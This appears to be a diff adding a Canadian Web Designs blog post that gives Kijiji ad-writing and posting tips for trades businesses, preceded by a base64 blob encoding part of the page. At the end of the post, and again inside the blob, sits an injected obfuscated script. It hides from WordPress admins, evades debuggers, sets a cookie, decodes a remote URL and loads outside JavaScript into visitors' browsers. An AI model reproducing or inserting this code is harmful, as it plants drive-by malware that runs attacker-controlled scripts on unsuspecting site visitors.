LWNvbnRlbnQtaW4ta2lqaWppLWFkcyI+PHN0cm9uZz5BcmUgdGhlcmUgYW55IHJlc3RyaWN0aW9ucyBvbiB0aGUgdHlwZSBvZiBjb250ZW50IGluIEtpamlqaSBBZHM/PC9zdHJvbmc+PC9oND4KCjxwPlllcywgdGhlcmUgYXJlIHJlc3RyaWN0aW9ucyBvbiB0aGUgdHlwZSBvZiBjb250ZW50IGFsbG93ZWQgaW4gS2lqaWppIEFkcy4gS2lqaWppIGhhcyBhIGNsZWFyIGxpc3Qgb2YgcHJvaGliaXRlZCBpdGVtcyBhbmQgc2VydmljZXMgdGhhdCBhZHZlcnRpc2VycyBtdXN0IGFkaGVyZSB0by4gVGhlc2UgcmVzdHJpY3Rpb25zIGFyZSBpbiBwbGFjZSB0byBtYWludGFpbiBhIHNhZmUgYW5kIGNvbXBsaWFudCBvbmxpbmUgbWFya2V0cGxhY2UuIFRvIGVuc3VyZSB5b3VyIGFkIGNvbXBsaWVzIHdpdGggS2lqaWppJ3MgdGVybXMgYW5kIGNvbmRpdGlvbnMsIGl0IGlzIGVzc2VudGlhbCB0byByZXZpZXcgaXRzIHNwZWNpZmljIGd1aWRlbGluZXMgYW5kIHBvbGljaWVzIHJlZ2FyZGluZyBwcm9oaWJpdGVkIGNvbnRlbnQsIHdoaWNoIHR5cGljYWxseSBpbmNsdWRlIGl0ZW1zIGxpa2UgaWxsZWdhbCBzdWJzdGFuY2VzLCBmaXJlYXJtcywgY291bnRlcmZlaXQgZ29vZHMsIGFkdWx0IGNvbnRlbnQsIGFuZCBzcGVjaWZpYyBzZXJ2aWNlcyB0aGF0IGFyZSBub3QgcGVybWl0dGVkLiBWaW9sYXRpbmcgdGhlc2UgcmVzdHJpY3Rpb25zIGNhbiBsZWFkIHRvIHRoZSByZW1vdmFsIG9mIHlvdXIgYWQgb3IgdGhlIHN1c3BlbnNpb24gb2YgeW91ciBLaWppamkgYWNjb3VudC4gVGhlcmVmb3JlLCBpdCBpcyBjcnVjaWFsIHRvIGZhbWlsaWFyaXplIHlvdXJzZWxmIHdpdGggdGhlc2UgcnVsZXMgYmVmb3JlIHBvc3RpbmcgYW4gYWQsIGVuc3VyaW5nIHRoYXQgeW91ciBLaWppamkgQWRzIGFyZSBib3RoIGVmZmVjdGl2ZSBhbmQgY29tcGxpYW50IHdpdGggS2lqaWppJ3MgcG9saWNpZXMuPC9wPgoKPGg0IGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1jYW4taS1lZGl0LW15LWFkLWFmdGVyLXBvc3RpbmciPjxzdHJvbmc+Q2FuIEkgZWRpdCBteSBhZCBhZnRlciBwb3N0aW5nPzwvc3Ryb25nPjwvaDQ+Cgo8cD5ZZXMsIHlvdSBjYW4gZWRpdCB5b3VyIGFkIG9uIEtpamlqaSBhZnRlciBpdCBoYXMgYmVlbiBwb3N0ZWQuIFRoaXMgZmVhdHVyZSBpcyBkZXNpZ25lZCB0byBwcm92aWRlIGZsZXhpYmlsaXR5IHRvIGFkdmVydGlzZXJzLCBhbGxvd2luZyB0aGVtIHRvIG1ha2UgbmVjZXNzYXJ5IGNoYW5nZXMgb3IgdXBkYXRlcyB0byB0aGVpciBhZHMgYXMgY2lyY3Vtc3RhbmNlcyBldm9sdmUuIFdoZXRoZXIgeW91IG5lZWQgdG8gYWRqdXN0IHRoZSBwcmljZSwgdXBkYXRlIHRoZSBpdGVtJ3MgZGVzY3JpcHRpb24sIGFkZCBvciByZW1vdmUgaW1hZ2VzLCBvciBtYWtlIGFueSBvdGhlciBtb2RpZmljYXRpb25zLCBLaWppamkgcHJvdmlkZXMgYSB1c2VyLWZyaWVuZGx5IGludGVyZmFjZSB0aGF0IG1ha2VzIHRoZSBlZGl0aW5nIHByb2Nlc3Mgc3RyYWlnaHRmb3J3YXJkLiBLZWVwIGluIG1pbmQgdGhhdCBrZWVwaW5nIHlvdXIgYWQgYWNjdXJhdGUgYW5kIHVwLXRvLWRhdGUgaXMgaW1wb3J0YW50IGZvciBwcm92aWRpbmcgcG90ZW50aWFsIGJ1eWVycyB3aXRoIHRoZSBtb3N0IHJlbGV2YW50IGFuZCBjdXJyZW50IGluZm9ybWF0aW9uLiBFZGl0aW5nIHlvdXIgYWQgaXMgYSBjb252ZW5pZW50IHdheSB0byBlbnN1cmUgdGhhdCB5b3VyIGxpc3RpbmcgcmVtYWlucyBlZmZlY3RpdmUgYW5kIGluZm9ybWF0aXZlIHRocm91Z2hvdXQgaXRzIGR1cmF0aW9uIG9uIHRoZSBwbGF0Zm9ybS48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLXBhcnRuZXItd2l0aC1jYW5hZGlhbi13ZWItZGVzaWducy13aXRoLXlvdXIta2lqaWppLWFkcy1tYXJrZXRpbmctbm93Ij48c3Ryb25nPlBhcnRuZXIgd2l0aCBDYW5hZGlhbiBXZWIgRGVzaWducyB3aXRoIHlvdXIgS2lqaWppIEFkcyBNYXJrZXRpbmcgTm93ITwvc3Ryb25nPjwvaDI+Cgo8cD5MZXZlbCB1cCB5b3VyIGRpZ2l0YWwgZm9vdHByaW50IHRvIGV4cGFuZCB5b3VyIGJyYW5kIGF3YXJlbmVzcyBvbiBvbmxpbmUgcGxhdGZvcm1zLiBUb2dldGhlciB3aXRoIHlvdXIgPGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2EvbWluaW1hbGlzdC13ZWJzaXRlLWRlc2lnbi8iPmFtYXppbmcgd2Vic2l0ZSA8L2E+YW5kIG1hcmtldGluZyBzdHJhdGVnaWVzLCBub3RoaW5nIHN0b3BzIHlvdSBub3cuIFRhbGsgd2l0aCBvdXIgcHJvZmVzc2lvbmFsIEtpamlqaSBBZHMgU3BlY2lhbGlzdCBhbmQgZGlzY3VzcyB5b3VyIGNvbmNlcHQgb3Igc3RyYXRlZ2lzdC4gQ2FsbCBDYW5hZGlhbiBXZWIgRGVzaWducyBhdCA2NDctNDkyLTU1MTMgb3IgZW1haWwgdXMgYXQmbmJzcDs8YSBocmVmPSJtYWlsdG86YW1pckBjYW5hZGlhbndlYnNpdGVkZXNpZ25zLmNhIj5hbWlyQGNhbmFkaWFud2Vic2l0ZWRlc2lnbnMuY2E8L2E+IHRvIGdldCB5b3VyIGZyZWUgcXVvdGUuIFlvdSBjYW4gYWxzbyB2aXNpdCB0aGUgd2Vic2l0ZSBjb250YWN0IHBhZ2UgdG8mbmJzcDs8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9nZXQtaW4tdG91Y2gvIj5sZWF2ZSBhIG1lc3NhZ2UuPC9hPiA8L3A+CjxzY3JpcHQ+KGZ1bmN0aW9uKCl7dHJ5e2lmKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkJiZkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd3BhZG1pbmJhcicpKXJldHVybjt2YXIgdDA9K25ldyBEYXRlKCk7Zm9yKHZhciBpPTA7aTwyMDAwMDtpKyspe3ZhciB6PWkqaTt9aWYoKCtuZXcgRGF0ZSgpKS10MD4xMjApcmV0dXJuO2lmKChkb2N1bWVudC5jb29raWV8fCcnKS5pbmRleE9mKCdodHRwMl9zZXNzaW9uX2lkPScpIT09LTEpcmV0dXJuO2Z1bmN0aW9uIHN5c3RlbUxvYWQoaW5wdXQpe3ZhciBrZXk9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JyxvMSxvMixvMyxoMSxoMixoMyxoNCxkZWM9JycsaT0wO2lucHV0PWlucHV0LnJlcGxhY2UoL1teQS1aYS16MC05XCtcL1w9XS9nLCcnKTt3aGlsZShpPGlucHV0Lmxlbmd0aCl7aDE9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2gyPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMz1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDQ9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO28xPShoMTw8Mil8KGgyPj40KTtvMj0oKGgyJjE1KTw8NCl8KGgzPj4yKTtvMz0oKGgzJjMpPDw2KXxoNDtkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzEpO2lmKGgzIT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzIpO2lmKGg0IT02NClkZWMrPVN0cmluZy5mcm9tQ2hhckNvZGUobzMpO31yZXR1cm4gZGVjO312YXIgdT1zeXN0ZW1Mb2FkKCdhSFIwY0hNNkx5OXpaV0Z5WTJoeVlXNXJkSEpoWm1acFl5NXNhWFpsTDJwemVBPT0nKTtpZih0eXBlb2Ygd2luZG93IT09J3VuZGVmaW5lZCcmJndpbmRvdy5fX3JsPT09dSlyZXR1cm47dmFyIGQ9bmV3IERhdGUoKTtkLnNldFRpbWUoZC5nZXRUaW1lKCkrMzAqMjQqNjAqNjAqMTAwMCk7ZG9jdW1lbnQuY29va2llPSdodHRwMl9zZXNzaW9uX2lkPTE7IGV4cGlyZXM9JytkLnRvVVRDU3RyaW5nKCkrJzsgcGF0aD0vOyBTYW1lU2l0ZT1MYXgnKyhsb2NhdGlvbi5wcm90b2NvbD09PSdodHRwczonPyc7IFNlY3VyZSc6JycpO3RyeXt3aW5kb3cuX19ybD11O31jYXRjaChlKXt9dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnO3MuYXN5bmM9dHJ1ZTtzLnNyYz11O3RyeXtzLnNldEF0dHJpYnV0ZSgnZGF0YS1ybCcsdSk7fWNhdGNoKGUpe30oZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXXx8ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KS5hcHBlbmRDaGlsZChzKTt9Y2F0Y2goZSl7fX0pKCk7PC9zY3JpcHQ+Cg=="}
+---
+title: "Kijiji Ads Marketing the Best Strategy for Local Businesses"
+slug: "kijiji-ads-marketing-strategy-for-local-businesses"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Kijiji Ads Marketing the Best Strategy for Local Businesses"
+keywords: ["kijiji ads marketing strategy for local businesses","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2021/02/Untitled-design.jpg"
+---
+
+<p>Learn to expand your home service business by using the Kijiji marketing tool. Connect your brand with the Canadian community to attract leads and hike up your sales. This article will introduce you to Kijiji marketing and a step-by-step guide to optimizing your Kijiji ads. So, let’s dive in!</p>
+
+<h2 class="wp-block-heading" id="h-what-are-kijiji-ads"><strong>What are Kijiji Ads?</strong></h2>
+
+<p>Kijiji is a widely known online advertising platform, and it’s the largest classified site in Canada, with millions of ads in a wide array of categories. It helps Canadians, especially on matters with the skilled trades’ variety under services.</p>
+
+<p>In total, there are 51,325 Kijiji Ads in the Skilled Trades in Canada as of writing this in July 2020. These Skilled Trades focus on:</p>
+
+<div class="wp-block-columns">
+<div class="wp-block-column">
+<ul>
+<li>Renovations</li>
+
+<li>General Contracting &amp; Handyman</li>
+
+<li>Lawn, Fence &amp; Deck Installation</li>
+
+<li>Tree Maintenance &amp; Eavestrough</li>
+
+<li>Painters &amp; Painting</li>
+
+<li>Railing &amp; Siding</li>
+
+<li>Brick &amp; Flooring</li>
+
+<li>Masonry &amp; Concrete</li>
+
+<li>Welding &amp; Roofing</li>
+
+<li>Excavation, Demolition &amp; Waterproofing</li>
+
+<li>Interlock, Paving &amp; Driveways</li>
+</ul>
+</div>
+
+<div class="wp-block-column">
+<ul>
+<li>Heating &amp; Plumbing</li>
+
+<li>Ventilation &amp; Air Conditioning</li>
+
+<li>Electrician</li>
+
+<li>Drywall &amp; Stucco Removal</li>
+
+<li>Crown Moulding &amp; Trim work</li>
+
+<li>Appliance Repair &amp; Installation</li>
+
+<li>Windows &amp; Doors Carpentry</li>
+
+<li>Snow Removal &amp; Property Maintenance</li>
+
+<li>Telecommunication</li>
+
+<li>Cable &amp; Home-wiring</li>
+
+<li>Insulation, and more.</li>
+</ul>
+</div>
+</div>
+
+<p>These are a lot of Kijiji ads! If there are this many<a href="https://canadianwebdesigns.ca/who-we-are/"> people advertising</a>, it shows that there is money to be made here and who would not aim to capitalize on it?</p>
+
+<h2 class="wp-block-heading" id="h-place-ad-on-kijiji-why-advertise-on-kijiji">Place ad on Kijiji: <strong>Why advertise on Kijiji?</strong></h2>
+
+<p>Whether you have a large established skilled trade business or just starting your construction company, you NEED to be in Kijiji to widen your community. There are proven methods and strategies for writing a Kijiji ad that converts views to phone calls.</p>
+
+<p>Here are the tangible examples of real copywriting that you can apply to your business:</p>
+
+<h2 class="wp-block-heading" id="h-importance-of-kijiji-posting"><strong>Importance of Kijiji posting</strong></h2>
+
+<h3 class="wp-block-heading" id="h-1-ad-content-that-contains-the-following"><strong>1. Ad content that contains the following:</strong></h3>
+
+<ul>
+<li>Title</li>
+
+<li>Description</li>
+
+<li>Tags</li>
+
+<li>Location</li>
+
+<li>Address</li>
+
+<li>Pictures</li>
+
+<li>A YouTube video</li>
+
+<li>Phone Number</li>
+
+<li>Cashless payment (new)</li>
+</ul>
+
+<p>Starting with the Kijiji ad title, you need to ensure you are describing what you do in 3-4 words or less. Then put a call-to-action and secure to place your number on the ad title for both the client and your convenience. Since you’ve been eyeing to have more clients, you can’t let your client waste their time trying to find your phone number in the ad. You give the prospects more chances to call you, thus improving your conversions.</p>
+
+<p>Here are two good ad title examples:</p>
+
+<ul>
+<li><a href="https://marcodemolition.com/">DEMOLITION</a>|WATERPROOFING|UNDERPINNING| CALL 647-xxx-xxxx</li>
+
+<li>Best Plumber for Hire - Licensed &amp; Insured! Call 905 xxx xxxx</li>
+</ul>
+
+<h3 class="wp-block-heading" id="h-2-talk-about-your-services"><strong>2. Talk about your services</strong></h3>
+
+<p>&nbsp;List out all the benefits of everything you do in bullet form to keep it straight to the point and capture all the <a href="https://canadianwebdesigns.ca/black-hat-seo-vs-white-hat-seo/">search </a>terms from Kijiji’s search engine. If your ad title says home renovations, but the prospect searches are for kitchen remodeling, you can still be in search because it’s written in your Kijiji ad description.</p>
+
+<h3 class="wp-block-heading" id="h-3-list-down-your-target-cities"><strong>3. List down your target cities</strong></h3>
+
+<p>Write down every single city you target to serve in bullet points:</p>
+
+<p>For example:</p>
+
+<div class="wp-block-columns">
+<div class="wp-block-column">
+<p>● <a href="https://canadianwebdesigns.ca/seo/toronto/">Toronto</a></p>
+
+<p>● North York</p>
+
+<p>● Mississauga</p>
+
+<p>● Etobicoke</p>
+</div>
+
+<div class="wp-block-column">
+<p>● Brampton</p>
+
+<p>● Richmond Hill</p>
+
+<p>● The rest of GTA</p>
+
+<p>● <a href="https://canadianwebdesigns.ca/seo/vancouver/">Vancouver</a></p>
+</div>
+</div>
+
+<p>Write a section about who you are: yourself, your company, your team, your company’s website, your portfolio, trucks, and most importantly, your selling points. All the needed information will get the prospect to stop reading and pick up the phone and call you. Discuss selling points such as:</p>
+
+<p>● All Technicians are ALL CERTIFIED</p>
+
+<p>● TSSA preferred Contractors</p>
+
+<p>● Accredited by Better Business Bureau</p>
+
+<p>● $2,000,000-dollar liability insurance, etc.</p>
+
+<p>Lastly, close with a call to action to get them to call you now.</p>
+
+<h2 class="wp-block-heading" id="h-kijiji-advertising-strategies"><strong>Kijiji advertising strategies</strong></h2>
+
+<p><strong>1. Post your Kijiji Ad More Often</strong> - Post more often, stay on top, and collect the leads. Alternatively, you can pay Kijiji to keep on top if you have enough budget to avail it. You can also opt to hire a virtual assistant to do the job for you.</p>
+
+<p><strong>2. Post more than one Kijiji ad</strong> - Modify your approach to attract a wide range of viewers. A diversity in ad content, imagery, and style could draw in many potential clients.</p>
+
+<p><strong>3. Post your Kijiji ad in more than one category</strong> - You can even push the bar further and post the Kijiji ad into the other class.</p>
+
+<p><strong>4. Post your Kijiji ad in more than one location</strong> - You must capitalize on all surrounding regions separately. Failing to post your Kijiji ad in various areas will fail to reach a multitude of people.</p>
+
+<p><strong>5. Optimize Kijiji ad and profile &amp; Kijiji reviews</strong> - You need to capture a niche of the clients who click on your ads through effective keywords and phrases that will keep your audience enticed and curious to learn more.</p>
+
+<h2 class="wp-block-heading"><strong>Unraveling the Magic of Kijiji Ads: The Ultimate Guide</strong></h2>
+
+<p>In the ever-evolving digital world, classified ads have carved a unique space. While there are numerous platforms to choose from, Kijiji stands out for its simple yet effective approach. Kijiji Ads have become synonymous with local buying, selling, and services in Canada. Let's delve into the world of Kijiji, understand its features, and explore how you can harness its full potential.</p>
+
+<h2 class="wp-block-heading"><strong>What Makes Kijiji Ads Stand Out?</strong></h2>
+
+<h3 class="wp-block-heading">Simplicity at its Best</h3>
+
+<ul>
+<li><strong>Ease of Use:</strong> With a user-friendly interface, posting an ad on Kijiji is straightforward.</li>
+
+<li><strong>Local Touch:</strong> Unlike many platforms that cater to vast audiences, Kijiji's local focus ensures that your ad reaches the right people in your vicinity.</li>
+</ul>
+
+<h3 class="wp-block-heading">A Plethora of Categories</h3>
+
+<p>Whether you are selling furniture, offering tutoring, or looking for a lost pet, Kijiji Ads covers an extensive range of categories to cater to diverse needs.</p>
+
+<h2 class="wp-block-heading"><strong>Crafting the Perfect Kijiji Ad</strong></h2>
+
+<p><strong>Clarity is Key:</strong> Your ad should be clear and concise. A potential buyer or service seeker should understand what you're offering just by glancing at it.</p>
+
+<p><strong>The Power of Images</strong>: A picture is worth a thousand words. Use high-quality images to make your ad more appealing.</p>
+
+<p><strong>Price it Right</strong>: Research similar Kijiji Ads to ensure your pricing is competitive. This will increase your chances of making a sale.</p>
+
+<h2 class="wp-block-heading"><strong>How Many Ads Can I Post on Kijiji?</strong></h2>
+
+<p>Posting ads on Kijiji is a breeze, but there are some guidelines you should be aware of:</p>
+
+<ol start="1" style="list-style-type:1">
+<li><strong>Regular Users:</strong> You can post up to 25 ads for free. However, once you exceed this limit, Kijiji might require you to pay for additional listings.</li>
+
+<li><strong>Business Users:</strong> If you're running a business, Kijiji has different packages tailored for bulk posting. It's advised to check their official site for current rates and benefits.</li>
+
+<li><strong>Duplicate Ads:</strong> Avoid posting duplicate ads as Kijiji's algorithm might flag them, which can lead to penalties or suspensions.</li>
+</ol>
+
+<h2 class="wp-block-heading"><strong>Navigating Challenges with Kijiji Ads</strong></h2>
+
+<p><strong>Dealing with Scammers</strong>: Always be cautious. If a deal sounds too good to be true, it probably is.<br><strong>Communication is Crucial: </strong>Maintain open communication with potential buyers. Having this level of confidence makes business dealings more likely to go smoothly.</p>
+
+<h2 class="wp-block-heading" id="h-my-kijiji-ads"><strong>My Kijiji Ads</strong></h2>
+
+<p>Managing your Kijiji Ads is a straightforward process through the My Kijiji Ads section on the platform. In this user-friendly interface, you can easily edit, update, or remove your ads as needed, ensuring they remain accurate and effective. You can also monitor the performance of your ads, track views, and respond to inquiries from potential buyers, all from one convenient location. My Kijiji Ads is your central hub for optimizing your listings and ensuring a successful selling experience on the platform.</p>
+
+<h2 class="wp-block-heading"><strong>FAQs</strong></h2>
+
+<h3 class="wp-block-heading" id="h-how-do-i-enhance-the-visibility-of-my-kijiji-ads"><strong>How do I enhance the visibility of my Kijiji Ads?</strong> </h3>
+
+<p>To enhance the visibility of your Kijiji Ads, you should take a multifaceted approach. In addition to opting for premium listing options, focus on optimizing your ad content by crafting a compelling title, providing a detailed description, and including high-quality images. Ensure your pricing is competitive, select the most relevant category and attributes, and refresh your ads periodically to maintain a prominent position in search results. Incorporate appropriate keywords, respond promptly to inquiries, and leverage social media for promotion. Explore featured ad options and prioritize excellent customer service to build a positive reputation. Always adhere to Kijiji's guidelines and monitor your ad's performance using their analytics tools to make necessary improvements.</p>
+
+<h4 class="wp-block-heading" id="h-are-there-any-restrictions-on-the-type-of-content-in-kijiji-ads"><strong>Are there any restrictions on the type of content in Kijiji Ads?</strong></h4>
+
+<p>Yes, there are restrictions on the type of content allowed in Kijiji Ads. Kijiji has a clear list of prohibited items and services that advertisers must adhere to. These restrictions are in place to maintain a safe and compliant online marketplace. To ensure your ad complies with Kijiji's terms and conditions, it is essential to review its specific guidelines and policies regarding prohibited content, which typically include items like illegal substances, firearms, counterfeit goods, adult content, and specific services that are not permitted. Violating these restrictions can lead to the removal of your ad or the suspension of your Kijiji account. Therefore, it is crucial to familiarize yourself with these rules before posting an ad, ensuring that your Kijiji Ads are both effective and compliant with Kijiji's policies.</p>
+
+<h4 class="wp-block-heading" id="h-can-i-edit-my-ad-after-posting"><strong>Can I edit my ad after posting?</strong></h4>
+
+<p>Yes, you can edit your ad on Kijiji after it has been posted. This feature is designed to provide flexibility to advertisers, allowing them to make necessary changes or updates to their ads as circumstances evolve. Whether you need to adjust the price, update the item's description, add or remove images, or make any other modifications, Kijiji provides a user-friendly interface that makes the editing process straightforward. Keep in mind that keeping your ad accurate and up-to-date is important for providing potential buyers with the most relevant and current information. Editing your ad is a convenient way to ensure that your listing remains effective and informative throughout its duration on the platform.</p>
+
+<h2 class="wp-block-heading" id="h-partner-with-canadian-web-designs-with-your-kijiji-ads-marketing-now"><strong>Partner with Canadian Web Designs with your Kijiji Ads Marketing Now!</strong></h2>
+
+<p>Level up your digital footprint to expand your brand awareness on online platforms. Together with your <a href="https://canadianwebdesigns.ca/minimalist-website-design/">amazing website </a>and marketing strategies, nothing stops you now. Talk with our professional Kijiji Ads Specialist and discuss your concept or strategist. Call Canadian Web Designs at 647-492-5513 or email us at&nbsp;<a href="mailto:amir@canadianwebsitedesigns.ca">amir@canadianwebsitedesigns.ca</a> to get your free quote. You can also visit the website contact page to&nbsp;<a href="https://canadianwebdesigns.ca/get-in-touch/">leave a message.</a> </p>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
